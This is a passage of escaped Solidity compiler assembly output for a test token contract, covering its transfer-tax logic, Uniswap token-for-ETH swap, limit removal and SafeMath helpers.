uniswapV2Pair && from != address(this) */\n    tag_275:\n        /* \"contracts/Test.sol\":10052:10376  if (to == uniswapV2Pair && from != address(this)) {... */\n      iszero\n      tag_276\n      jumpi\n        /* \"contracts/Test.sol\":10132:10361  amount... */\n      tag_277\n        /* \"contracts/Test.sol\":10357:10360  100 */\n      0x64\n        /* \"contracts/Test.sol\":10132:10331  amount... */\n      tag_237\n        /* \"contracts/Test.sol\":10202:10218  _reduceSellTaxAt */\n      sload(0x0c)\n        /* \"contracts/Test.sol\":10190:10199  _buyCount */\n      sload(0x0e)\n        /* \"contracts/Test.sol\":10190:10218  _buyCount > _reduceSellTaxAt */\n      gt\n        /* \"contracts/Test.sol\":10189:10309  (_buyCount > _reduceSellTaxAt)... */\n      tag_279\n      jumpi\n        /* \"contracts/Test.sol\":10294:10309  _initialSellTax */\n      sload(0x08)\n        /* \"contracts/Test.sol\":10189:10309  (_buyCount > _reduceSellTaxAt)... */\n      jump(tag_239)\n    tag_279:\n        /* \"contracts/Test.sol\":10250:10263  _finalSellTax */\n      sload(0x0a)\n        /* \"contracts/Test.sol\":10132:10138  amount */\n      dup6\n      swap1\n        /* \"contracts/Test.sol\":10132:10163  amount... */\n      tag_240\n        /* \"contracts/Test.sol\":10132:10331  amount... */\n      jump\t// in\n        /* \"contracts/Test.sol\":10132:10361  amount... */\n    tag_277:\n        /* \"contracts/Test.sol\":10120:10361  taxAmount = amount... */\n      swap1\n      pop\n        /* \"contracts/Test.sol\":10052:10376  if (to == uniswapV2Pair && from != address(this)) {... */\n    tag_276:\n        /* \"contracts/Test.sol\":10439:10443  this */\n      address\n        /* \"contracts/Test.sol\":10390:10418  uint256 contractTokenBalance */\n      0x00\n        /* \"contracts/Test.sol\":6723:6741  _balances[account] */\n      swap1\n      dup2\n      mstore\n        /* \"contracts/Test.sol\":6723:6732  _balances */\n      0x01\n        /* \"contracts/Test.sol\":6723:6741  _balances[account] */\n      0x20\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n        /* \"contracts/Test.sol\":10481:10487  inSwap */\n      sload(0x14)\n      shl(0xa8, 0x01)\n      swap1\n      div\n      0xff\n      and\n        /* \"contracts/Test.sol\":10480:10487  !inSwap */\n      iszero\n        /* \"contracts/Test.sol\":10480:10526  !inSwap &&... */\n      dup1\n      iszero\n      tag_282\n      jumpi\n      pop\n        /* \"contracts/Test.sol\":10513:10526  uniswapV2Pair */\n      sload(0x14)\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Test.sol\":10507:10526  to == uniswapV2Pair */\n      dup6\n      dup2\n      and\n        /* \"contracts/Test.sol\":10513:10526  uniswapV2Pair */\n      swap2\n      and\n        /* \"contracts/Test.sol\":10507:10526  to == uniswapV2Pair */\n      eq\n        /* \"contracts/Test.sol\":10480:10526  !inSwap &&... */\n    tag_282:\n        /* \"contracts/Test.sol\":10480:10557  !inSwap &&... */\n      dup1\n      iszero\n      tag_283\n      jumpi\n      pop\n        /* \"contracts/Test.sol\":10546:10557  swapEnabled */\n      sload(0x14)\n      shl(0xb0, 0x01)\n      swap1\n      div\n      0xff\n      and\n        /* \"contracts/Test.sol\":10480:10557  !inSwap &&... */\n    tag_283:\n        /* \"contracts/Test.sol\":10480:10617  !inSwap &&... */\n      dup1\n      iszero\n      tag_284\n      jumpi\n      pop\n        /* \"contracts/Test.sol\":10600:10617  _taxSwapThreshold */\n      sload(0x11)\n        /* \"contracts/Test.sol\":10577:10597  contractTokenBalance */\n      dup2\n        /* \"contracts/Test.sol\":10577:10617  contractTokenBalance > _taxSwapThreshold */\n      gt\n        /* \"contracts/Test.sol\":10480:10617  !inSwap &&... */\n    tag_284:\n        /* \"contracts/Test.sol\":10480:10667  !inSwap &&... */\n      dup1\n      iszero\n      tag_285\n      jumpi\n      pop\n        /* \"contracts/Test.sol\":10649:10667  _preventSwapBefore */\n      sload(0x0d)\n        /* \"contracts/Test.sol\":10637:10646  _buyCount */\n      sload(0x0e)\n        /* \"contracts/Test.sol\":10637:10667  _buyCount > _preventSwapBefore */\n      gt\n        /* \"contracts/Test.sol\":10480:10667  !inSwap &&... */\n    tag_285:\n        /* \"contracts/Test.sol\":10459:11011  if (... */\n      iszero\n      tag_286\n      jumpi\n        /* \"contracts/Test.sol\":10700:10807  swapTokensForEth(... */\n      tag_287\n        /* \"contracts/Test.sol\":10738:10789  min(amount, min(contractTokenBalance, _maxTaxSwap)) */\n      tag_288\n        /* \"contracts/Test.sol\":10742:10748  amount */\n      dup5\n        /* \"contracts/Test.sol\":10750:10788  min(contractTokenBalance, _maxTaxSwap) */\n      tag_289\n        /* \"contracts/Test.sol\":10754:10774  contractTokenBalance */\n      dup5\n        /* \"contracts/Test.sol\":10776:10787  _maxTaxSwap */\n      sload(0x12)\n        /* \"contracts/Test.sol\":10750:10753  min */\n      tag_290\n        /* \"contracts/Test.sol\":10750:10788  min(contractTokenBalance, _maxTaxSwap) */\n      jump\t// in\n    tag_289:\n        /* \"contracts/Test.sol\":10738:10741  min */\n      tag_290\n        /* \"contracts/Test.sol\":10738:10789  min(amount, min(contractTokenBalance, _maxTaxSwap)) */\n      jump\t// in\n    tag_288:\n        /* \"contracts/Test.sol\":10700:10716  swapTokensForEth */\n      tag_179\n        /* \"contracts/Test.sol\":10700:10807  swapTokensForEth(... */\n      jump\t// in\n    tag_287:\n        /* \"contracts/Test.sol\":10854:10875  address(this).balance */\n      selfbalance\n        /* \"contracts/Test.sol\":10897:10919  contractETHBalance > 0 */\n      dup1\n      iszero\n        /* \"contracts/Test.sol\":10893:10997  if (contractETHBalance > 0) {... */\n      tag_292\n      jumpi\n        /* \"contracts/Test.sol\":10943:10978  sendETHToFee(address(this).balance) */\n      tag_292\n        /* \"contracts/Test.sol\":10956:10977  address(this).balance */\n      selfbalance\n        /* \"contracts/Test.sol\":10943:10955  sendETHToFee */\n      tag_293\n        /* \"contracts/Test.sol\":10943:10978  sendETHToFee(address(this).balance) */\n      jump\t// in\n    tag_292:\n        /* \"contracts/Test.sol\":10682:11011  {... */\n      pop\n        /* \"contracts/Test.sol\":10459:11011  if (... */\n    tag_286:\n        /* \"contracts/Test.sol\":8655:11021  {... */\n      pop\n        /* \"contracts/Test.sol\":8617:11021  if (from != owner() && to != owner()) {... */\n    tag_235:\n        /* \"contracts/Test.sol\":11035:11048  taxAmount > 0 */\n      dup1\n      iszero\n        /* \"contracts/Test.sol\":11031:11200  if (taxAmount > 0) {... */\n      tag_294\n      jumpi\n        /* \"contracts/Test.sol\":11109:11113  this */\n      address\n        /* \"contracts/Test.sol\":11091:11115  _balances[address(this)] */\n      0x00\n      swap1\n      dup2\n      mstore\n        /* \"contracts/Test.sol\":11091:11100  _balances */\n      0x01\n        /* \"contracts/Test.sol\":11091:11115  _balances[address(this)] */\n      0x20\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n        /* \"contracts/Test.sol\":11091:11130  _balances[address(this)].add(taxAmount) */\n      tag_295\n      swap1\n        /* \"contracts/Test.sol\":11120:11129  taxAmount */\n      dup3\n        /* \"contracts/Test.sol\":11091:11119  _balances[address(this)].add */\n      tag_296\n        /* \"contracts/Test.sol\":11091:11130  _balances[address(this)].add(taxAmount) */\n      jump\t// in\n    tag_295:\n        /* \"contracts/Test.sol\":11082:11086  this */\n      address\n        /* \"contracts/Test.sol\":11064:11088  _balances[address(this)] */\n      0x00\n      dup2\n      dup2\n      mstore\n        /* \"contracts/Test.sol\":11064:11073  _balances */\n      0x01\n        /* \"contracts/Test.sol\":11064:11088  _balances[address(this)] */\n      0x20\n      mstore\n      0x40\n      swap1\n      dup2\n      swap1\n      keccak256\n        /* \"contracts/Test.sol\":11064:11130  _balances[address(this)] = _balances[address(this)].add(taxAmount) */\n      swap3\n      swap1\n      swap3\n      sstore\n        /* \"contracts/Test.sol\":11149:11189  Transfer(from, address(this), taxAmount) */\n      swap1\n      mload\n      sub(shl(0xa0, 0x01), 0x01)\n      dup7\n      and\n      swap1\n      0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef\n      swap1\n      tag_297\n      swap1\n        /* \"contracts/Test.sol\":11179:11188  taxAmount */\n      dup6\n        /* \"#utility.yul\":1361:1386   */\n      dup2\n      mstore\n        /* \"#utility.yul\":1349:1351   */\n      0x20\n        /* \"#utility.yul\":1334:1352   */\n      add\n      swap1\n        /* \"#utility.yul\":1215:1392   */\n      jump\n        /* \"contracts/Test.sol\":11149:11189  Transfer(from, address(this), taxAmount) */\n    tag_297:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log3\n        /* \"contracts/Test.sol\":11031:11200  if (taxAmount > 0) {... */\n    tag_294:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Test.sol\":11227:11242  _balances[from] */\n      dup5\n      and\n      0x00\n      swap1\n      dup2\n      mstore\n        /* \"contracts/Test.sol\":11227:11236  _balances */\n      0x01\n        /* \"contracts/Test.sol\":11227:11242  _balances[from] */\n      0x20\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n        /* \"contracts/Test.sol\":11227:11254  _balances[from].sub(amount) */\n      tag_298\n      swap1\n        /* \"contracts/Test.sol\":11247:11253  amount */\n      dup4\n        /* \"contracts/Test.sol\":11227:11246  _balances[from].sub */\n      tag_299\n        /* \"contracts/Test.sol\":11227:11254  _balances[from].sub(amount) */\n      jump\t// in\n    tag_298:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Test.sol\":11209:11224  _balances[from] */\n      dup6\n      and\n      0x00\n      swap1\n      dup2\n      mstore\n        /* \"contracts/Test.sol\":11209:11218  _balances */\n      0x01\n        /* \"contracts/Test.sol\":11209:11224  _balances[from] */\n      0x20\n      mstore\n      0x40\n      swap1\n      keccak256\n        /* \"contracts/Test.sol\":11209:11254  _balances[from] = _balances[from].sub(amount) */\n      sstore\n        /* \"contracts/Test.sol\":11280:11320  _balances[to].add(amount.sub(taxAmount)) */\n      tag_300\n        /* \"contracts/Test.sol\":11298:11319  amount.sub(taxAmount) */\n      tag_301\n        /* \"contracts/Test.sol\":11298:11304  amount */\n      dup4\n        /* \"contracts/Test.sol\":11309:11318  taxAmount */\n      dup4\n        /* \"contracts/Test.sol\":11298:11308  amount.sub */\n      tag_299\n        /* \"contracts/Test.sol\":11298:11319  amount.sub(taxAmount) */\n      jump\t// in\n    tag_301:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Test.sol\":11280:11293  _balances[to] */\n      dup6\n      and\n      0x00\n      swap1\n      dup2\n      mstore\n        /* \"contracts/Test.sol\":11280:11289  _balances */\n      0x01\n        /* \"contracts/Test.sol\":11280:11293  _balances[to] */\n      0x20\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n      swap1\n        /* \"contracts/Test.sol\":11280:11297  _balances[to].add */\n      tag_296\n        /* \"contracts/Test.sol\":11280:11320  _balances[to].add(amount.sub(taxAmount)) */\n      jump\t// in\n    tag_300:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Test.sol\":11264:11277  _balances[to] */\n      dup1\n      dup6\n      and\n      0x00\n      dup2\n      dup2\n      mstore\n        /* \"contracts/Test.sol\":11264:11273  _balances */\n      0x01\n        /* \"contracts/Test.sol\":11264:11277  _balances[to] */\n      0x20\n      mstore\n      0x40\n      swap1\n      keccak256\n        /* \"contracts/Test.sol\":11264:11320  _balances[to] = _balances[to].add(amount.sub(taxAmount)) */\n      swap3\n      swap1\n      swap3\n      sstore\n        /* \"contracts/Test.sol\":11335:11376  Transfer(from, to, amount.sub(taxAmount)) */\n      dup6\n      and\n      0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef\n        /* \"contracts/Test.sol\":11354:11375  amount.sub(taxAmount) */\n      tag_302\n        /* \"contracts/Test.sol\":11354:11360  amount */\n      dup6\n        /* \"contracts/Test.sol\":11365:11374  taxAmount */\n      dup6\n        /* \"contracts/Test.sol\":11354:11364  amount.sub */\n      tag_299\n        /* \"contracts/Test.sol\":11354:11375  amount.sub(taxAmount) */\n      jump\t// in\n    tag_302:\n        /* \"contracts/Test.sol\":11335:11376  Transfer(from, to, amount.sub(taxAmount)) */\n      mload(0x40)\n        /* \"#utility.yul\":1361:1386   */\n      swap1\n      dup2\n      mstore\n        /* \"#utility.yul\":1349:1351   */\n      0x20\n        /* \"#utility.yul\":1334:1352   */\n      add\n        /* \"contracts/Test.sol\":11335:11376  Transfer(from, to, amount.sub(taxAmount)) */\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log3\n        /* \"contracts/Test.sol\":8143:11383  {... */\n      pop\n        /* \"contracts/Test.sol\":8074:11383  function _transfer(address from, address to, uint256 amount) private {... */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"contracts/Test.sol\":1312:1528  function sub(... */\n    tag_141:\n        /* \"contracts/Test.sol\":1428:1435  uint256 */\n      0x00\n        /* \"contracts/Test.sol\":1463:1475  errorMessage */\n      dup2\n        /* \"contracts/Test.sol\":1455:1461  b <= a */\n      dup5\n      dup5\n      gt\n      iszero\n        /* \"contracts/Test.sol\":1447:1476  require(b <= a, errorMessage) */\n      tag_305\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x04\n      add\n      tag_146\n      swap2\n      swap1\n      tag_33\n      jump\t// in\n    tag_305:\n      pop\n        /* \"contracts/Test.sol\":1486:1495  uint256 c */\n      0x00\n        /* \"contracts/Test.sol\":1498:1503  a - b */\n      tag_307\n        /* \"contracts/Test.sol\":1502:1503  b */\n      dup5\n        /* \"contracts/Test.sol\":1498:1499  a */\n      dup7\n        /* \"contracts/Test.sol\":1498:1503  a - b */\n      tag_308\n      jump\t// in\n    tag_307:\n        /* \"contracts/Test.sol\":1486:1503  uint256 c = a - b */\n      swap6\n        /* \"contracts/Test.sol\":1312:1528  function sub(... */\n      swap5\n      pop\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"contracts/Test.sol\":12062:12533  function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {... */\n    tag_179:\n        /* \"contracts/Test.sol\":5129:5135  inSwap */\n      0x14\n        /* \"contracts/Test.sol\":5129:5142  inSwap = true */\n      dup1\n      sload\n      not(shl(0xa8, 0xff))\n      and\n      shl(0xa8, 0x01)\n      or\n      swap1\n      sstore\n        /* \"contracts/Test.sol\":12163:12179  new address[](2) */\n      0x40\n      dup1\n      mload\n        /* \"contracts/Test.sol\":12177:12178  2 */\n      0x02\n        /* \"contracts/Test.sol\":12163:12179  new address[](2) */\n      dup1\n      dup3\n      mstore\n      0x60\n      dup3\n      add\n      dup4\n      mstore\n      0x00\n      swap3\n      0x20\n      dup4\n      add\n      swap1\n      dup1\n      calldatasize\n      dup4\n      calldatacopy\n      add\n      swap1\n      pop\n      pop\n        /* \"contracts/Test.sol\":12139:12179  address[] memory path = new address[](2) */\n      swap1\n      pop\n        /* \"contracts/Test.sol\":12207:12211  this */\n      address\n        /* \"contracts/Test.sol\":12189:12193  path */\n      dup2\n        /* \"contracts/Test.sol\":12194:12195  0 */\n      0x00\n        /* \"contracts/Test.sol\":12189:12196  path[0] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_316\n      jumpi\n      tag_316\n      tag_317\n      jump\t// in\n    tag_316:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Test.sol\":12189:12212  path[0] = address(this) */\n      swap3\n      dup4\n      and\n        /* \"contracts/Test.sol\":12189:12196  path[0] */\n      0x20\n      swap2\n      dup3\n      mul\n      swap3\n      swap1\n      swap3\n      add\n      dup2\n      add\n        /* \"contracts/Test.sol\":12189:12212  path[0] = address(this) */\n      swap2\n      swap1\n      swap2\n      mstore\n        /* \"contracts/Test.sol\":12232:12247  uniswapV2Router */\n      sload(0x13)\n        /* \"contracts/Test.sol\":12232:12254  uniswapV2Router.WETH() */\n      0x40\n      dup1\n      mload\n      shl(0xe3, 0x15ab88c9)\n      dup2\n      mstore\n      swap1\n      mload\n        /* \"contracts/Test.sol\":12232:12247  uniswapV2Router */\n      swap2\n      swap1\n      swap4\n      and\n      swap3\n        /* \"contracts/Test.sol\":12232:12252  uniswapV2Router.WETH */\n      0xad5c4648\n      swap3\n        /* \"contracts/Test.sol\":12232:12254  uniswapV2Router.WETH() */\n      0x04\n      dup1\n      dup4\n      add\n      swap4\n        /* \"contracts/Test.sol\":12189:12196  path[0] */\n      swap2\n      swap3\n        /* \"contracts/Test.sol\":12232:12254  uniswapV2Router.WETH() */\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"contracts/Test.sol\":12232:12247  uniswapV2Router */\n      dup7\n        /* \"contracts/Test.sol\":12232:12254  uniswapV2Router.WETH() */\n      gas\n      staticcall\n      iszero\n      dup1\n      iszero\n      tag_319\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_319:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_320\n      swap2\n      swap1\n      tag_321\n      jump\t// in\n    tag_320:\n        /* \"contracts/Test.sol\":12222:12226  path */\n      dup2\n        /* \"contracts/Test.sol\":12227:12228  1 */\n      0x01\n        /* \"contracts/Test.sol\":12222:12229  path[1] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_323\n      jumpi\n      tag_323\n      tag_317\n      jump\t// in\n    tag_323:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Test.sol\":12222:12254  path[1] = uniswapV2Router.WETH() */\n      swap3\n      dup4\n      and\n        /* \"contracts/Test.sol\":12222:12229  path[1] */\n      0x20\n      swap2\n      dup3\n      mul\n      swap3\n      swap1\n      swap3\n      add\n      add\n        /* \"contracts/Test.sol\":12222:12254  path[1] = uniswapV2Router.WETH() */\n      mstore\n        /* \"contracts/Test.sol\":12296:12311  uniswapV2Router */\n      sload(0x13)\n        /* \"contracts/Test.sol\":12264:12326  _approve(address(this), address(uniswapV2Router), tokenAmount) */\n      tag_324\n      swap2\n        /* \"contracts/Test.sol\":12281:12285  this */\n      address\n      swap2\n        /* \"contracts/Test.sol\":12296:12311  uniswapV2Router */\n      and\n        /* \"contracts/Test.sol\":12314:12325  tokenAmount */\n      dup5\n        /* \"contracts/Test.sol\":12264:12272  _approve */\n      tag_128\n        /* \"contracts/Test.sol\":12264:12326  _approve(address(this), address(uniswapV2Router), tokenAmount) */\n      jump\t// in\n    tag_324:\n        /* \"contracts/Test.sol\":12336:12351  uniswapV2Router */\n      sload(0x13)\n        /* \"contracts/Test.sol\":12336:12526  uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(... */\n      mload(0x40)\n      shl(0xe0, 0x791ac947)\n      dup2\n      mstore\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Test.sol\":12336:12351  uniswapV2Router */\n      swap1\n      swap2\n      and\n      swap1\n        /* \"contracts/Test.sol\":12336:12402  uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens */\n      0x791ac947\n      swap1\n        /* \"contracts/Test.sol\":12336:12526  uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(... */\n      tag_325\n      swap1\n        /* \"contracts/Test.sol\":12416:12427  tokenAmount */\n      dup6\n      swap1\n        /* \"contracts/Test.sol\":12336:12351  uniswapV2Router */\n      0x00\n      swap1\n        /* \"contracts/Test.sol\":12456:12460  path */\n      dup7\n      swap1\n        /* \"contracts/Test.sol\":12482:12486  this */\n      address\n      swap1\n        /* \"contracts/Test.sol\":12501:12516  block.timestamp */\n      timestamp\n      swap1\n        /* \"contracts/Test.sol\":12336:12526  uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(... */\n      0x04\n      add\n      tag_326\n      jump\t// in\n    tag_325:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_327\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_327:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_329\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_329:\n      pop\n      pop\n        /* \"contracts/Test.sol\":5163:5169  inSwap */\n      0x14\n        /* \"contracts/Test.sol\":5163:5177  inSwap = false */\n      dup1\n      sload\n      not(shl(0xa8, 0xff))\n      and\n      swap1\n      sstore\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/Test.sol\":12062:12533  function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {... */\n      jump\t// out\n        /* \"contracts/Test.sol\":11584:11731  function removeLimits() private {... */\n    tag_231:\n        /* \"contracts/Test.sol\":4508:4523  10 ** _decimals */\n      tag_331\n        /* \"contracts/Test.sol\":4345:4347  18 */\n      0x12\n        /* \"contracts/Test.sol\":4508:4510  10 */\n      0x0a\n        /* \"contracts/Test.sol\":4508:4523  10 ** _decimals */\n      tag_131\n      jump\t// in\n    tag_331:\n        /* \"contracts/Test.sol\":4492:4523  1_000_000_000 * 10 ** _decimals */\n      tag_332\n      swap1\n        /* \"contracts/Test.sol\":4492:4505  1_000_000_000 */\n      0x3b9aca00\n        /* \"contracts/Test.sol\":4492:4523  1_000_000_000 * 10 ** _decimals */\n      tag_133\n      jump\t// in\n    tag_332:\n        /* \"contracts/Test.sol\":11626:11638  _maxTxAmount */\n      0x0f\n        /* \"contracts/Test.sol\":11626:11648  _maxTxAmount = _tTotal */\n      sstore\n        /* \"contracts/Test.sol\":4508:4523  10 ** _decimals */\n      tag_333\n        /* \"contracts/Test.sol\":4345:4347  18 */\n      0x12\n        /* \"contracts/Test.sol\":4508:4510  10 */\n      0x0a\n        /* \"contracts/Test.sol\":4508:4523  10 ** _decimals */\n      tag_131\n      jump\t// in\n    tag_333:\n        /* \"contracts/Test.sol\":4492:4523  1_000_000_000 * 10 ** _decimals */\n      tag_334\n      swap1\n        /* \"contracts/Test.sol\":4492:4505  1_000_000_000 */\n      0x3b9aca00\n        /* \"contracts/Test.sol\":4492:4523  1_000_000_000 * 10 ** _decimals */\n      tag_133\n      jump\t// in\n    tag_334:\n        /* \"contracts/Test.sol\":11658:11672  _maxWalletSize */\n      0x10\n        /* \"contracts/Test.sol\":11658:11682  _maxWalletSize = _tTotal */\n      sstore\n        /* \"contracts/Test.sol\":11697:11724  MaxTxAmountUpdated(_tTotal) */\n      0x947f344d56e1e8c70dc492fb94c4ddddd490c016aab685f5e7e47b2e85cb44cf\n        /* \"contracts/Test.sol\":4508:4523  10 ** _decimals */\n      tag_335\n        /* \"contracts/Test.sol\":4345:4347  18 */\n      0x12\n        /* \"contracts/Test.sol\":4508:4510  10 */\n      0x0a\n        /* \"contracts/Test.sol\":4508:4523  10 ** _decimals */\n      tag_131\n      jump\t// in\n    tag_335:\n        /* \"contracts/Test.sol\":4492:4523  1_000_000_000 * 10 ** _decimals */\n      tag_336\n      swap1\n        /* \"contracts/Test.sol\":4492:4505  1_000_000_000 */\n      0x3b9aca00\n        /* \"contracts/Test.sol\":4492:4523  1_000_000_000 * 10 ** _decimals */\n      tag_133\n      jump\t// in\n    tag_336:\n        /* \"contracts/Test.sol\":11697:11724  MaxTxAmountUpdated(_tTotal) */\n      mload(0x40)\n        /* \"#utility.yul\":1361:1386   */\n      swap1\n      dup2\n      mstore\n        /* \"#utility.yul\":1349:1351   */\n      0x20\n        /* \"#utility.yul\":1334:1352   */\n      add\n        /* \"contracts/Test.sol\":11697:11724  MaxTxAmountUpdated(_tTotal) */\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log1\n        /* \"contracts/Test.sol\":11584:11731  function removeLimits() private {... */\n      jump\t// out\n        /* \"contracts/Test.sol\":1534:1773  function mul(uint256 a, uint256 b) internal pure returns (uint256) {... */\n    tag_240:\n        /* \"contracts/Test.sol\":1592:1599  uint256 */\n      0x00\n        /* \"contracts/Test.sol\":1615:1616  a */\n      dup3\n        /* \"contracts/Test.sol\":1620:1621  0 */\n      0x00\n        /* \"contracts/Test.sol\":1615:1621  a == 0 */\n      sub\n        /* \"contracts/Test.sol\":1611:1656  if (a == 0) {... */\n      tag_339\n      jumpi\n      pop\n        /* \"contracts/Test.sol\":1644:1645  0 */\n      0x00\n        /* \"contracts/Test.sol\":1637:1645  return 0 */\n      jump(tag_124)\n        /* \"contracts/Test.sol\":1611:1656  if (a == 0) {... */\n    tag_339:\n        /* \"contracts/Test.sol\":1665:1674  uint256 c */\n      0x00\n        /* \"contracts/Test.sol\":1677:1682  a * b */\n      tag_340\n        /* \"contracts/Test.sol\":1681:1682  b */\n      dup4\n        /* \"contracts/Test.sol\":1677:1678  a */\n      dup6\n        /* \"contracts/Test.sol\":1677:1682  a * b */\n      tag_133\n      jump\t// in\n    tag_340:\n        /* \"contracts/Test.sol\":1665:1682  uint256 c = a * b */\n      swap1\n      pop\n        /* \"contracts/Test.sol\":1709:1710  b */\n      dup3\n        /* \"contracts/Test.sol\":1700:1705  c / a */\n      tag_341\n        /* \"contracts/Test.sol\":1704:1705  a */\n      dup6\n        /* \"contracts/Test.sol\":1665:1682  uint256 c = a * b */\n      dup4\n        /* \"contracts/Test.sol\":1700:1705  c / a */\n      tag_342\n      jump\t// in\n    tag_341:\n        /* \"contracts/Test.sol\":1700:1710  c / a == b */\n      eq\n        /* \"contracts/Test.sol\":1692:1748  require(c / a == b, \"SafeMath: multiplication overflow\") */\n      tag_343\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n        /* \"#utility.yul\":13647:13649   */\n      0x20\n        /* \"contracts/Test.sol\":1692:1748  require(c / a == b, \"SafeMath: multiplication overflow\") */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":13629:13650   */\n      mstore\n        /* \"#utility.yul\":13686:13688   */\n      0x21\n        /* \"#utility.yul\":13666:13684   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":13659:13689   */\n      mstore\n        /* \"#utility.yul\":13725:13759   */\n      0x536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f\n        /* \"#utility.yul\":13705:13723   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":13698:13760   */\n      mstore\n      shl(0xf8, 0x77)\n        /* \"#utility.yul\":13776:13794   */\n      0x64\n      dup3\n      add\n        /* \"#utility.yul\":13769:13800   */\n      mstore\n        /* \"#utility.yul\":13817:13836   */\n      0x84\n      add\n        /* \"contracts/Test.sol\":1692:1748  require(c / a == b, \"SafeMath: multiplication overflow\") */\n      tag_146\n        /* \"#utility.yul\":13445:13842   */\n      jump\n        /* \"contracts/Test.sol\":1692:1748  require(c / a == b, \"SafeMath: multiplication overflow\") */\n    tag_343:\n        /* \"contracts/Test.sol\":1765:1766  c */\n      swap4\n        /* \"contracts/Test.sol\":1534:1773  function mul(uint256 a, uint256 b) internal pure returns (uint256) {... */\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"contracts/Test.sol\":1779:1909  function div(uint256 a, uint256 b) internal pure returns (uint256) {... */\n    tag_241:\n        /* \"contracts/Test.sol\":1837:1844  uint256 */\n      0x00\n        /* \"contracts/Test.sol\":1863:1902  div(a, b, \"SafeMath: division by zero\") */\n      tag_343\n        /* \"contracts/Test.sol\":1867:1868  a */\n      dup4\n        /* \"contracts/Test.sol\":1870:1871  b */\n      dup4\n        /* \"contracts/Test.sol\":1863:1902  div(a, b, \"SafeMath: division by zero\") */\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x1a\n      dup2\n      mstore\n      0x20\n      add\n      0x536166654d6174683a206469766973696f6e206279207a65726f000000000000\n      dup2\n      mstore\n      pop\n        /* \"contracts/Test.sol\":1863:1866  div */\n      tag_348\n        /* \"contracts/Test.sol\":1863:1902  div(a, b, \"SafeMath: division by zero\") */\n      jump\t// in\n        /* \"contracts/Test.sol\":12539:12644  function min(uint256 a, uint256 b) private pure returns (uint256) {... */\n    tag_290:\n        /* \"contracts/Test.sol\":12596:12603  uint256 */\n      0x00\n        /* \"contracts/Test.sol\":12627:12628  b */\n      dup2\n        /* \"contracts/Test.sol\":12623:12624  a */\n      dup4\n        /* \"contracts/Test.sol\":12623:12628  a > b */\n      gt\n        /* \"contracts/Test.sol\":12622:12637  (a > b) ? b : a */\n      tag_351\n      jumpi\n        /* \"contracts/Test.sol\":12636:12637  a */\n      dup3\n        /* \"contracts/Test.sol\":12622:12637  (a > b) ? b : a */\n      jump(tag_343)\n    tag_351:\n      pop\n        /* \"contracts/Test.sol\":12632:12633  b */\n      swap2\n        /* \"contracts/Test.sol\":12539:12644  function min(uint256 a, uint256 b) private pure returns (uint256) {... */\n      swap1\n      pop\n      jump\t// out\n        /* \"contracts/Test.sol\":12650:12740  function sendETHToFee(uint256 amount) private {... */\n    tag_293:\n        /* \"contracts/Test.sol\":12706:12716  _taxWallet */\n      sload(0x05)\n        /* \"contracts/Test.sol\":12706:12733  _taxWallet.transfer(amount) */\n      mload(0x40)\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Test.sol\":12706:12716  _taxWallet */\n      swap1\n      swap2\n      and\n      swap1\n        /* \"contracts/Test.sol\":12706:12733  _taxWallet.transfer(amount) */\n      dup3\n      iszero\n      0x08fc\n      mul\n      swap1\n        /* \"contracts/Test.sol\":12726:12732  amount */\n      dup4\n      swap1\n        /* \"contracts/Test.sol\":12706:12716  _taxWallet */\n      0x00\n        /* 